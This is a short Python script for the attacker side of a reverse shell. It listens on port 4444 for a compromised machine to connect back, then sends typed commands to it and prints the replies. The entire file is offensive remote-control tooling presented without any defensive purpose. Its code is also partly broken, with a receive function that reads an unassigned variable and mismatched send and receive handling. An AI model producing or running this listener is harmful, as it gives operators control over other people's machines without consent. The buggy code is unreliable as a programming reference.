#!usr/bin/python

import socket, json

ip = "0.0.0.0"
port = 4444

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[-] Waiting for incomming connection.")
        self.connection, address = listener.accept()
        print(f"[+] Successfully connected to : {address}")
    
    def exe_remort(self,command):
        self.reliable_send(command)
        return self.connection.recv(1024)
    
    def reliable_send(self,data):
        json_data = json.dumps(data)
        return self.connection.send(bytes(json_data,encoding="utf-8"))
    
    def reliable_receive(self):
        while True:
            try:
                json_data =  json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        while True:
            command = input(">> ")
            result = self.exe_remort(command)
            print(result)

listener_on = Listener(ip,port)
listener_on.run()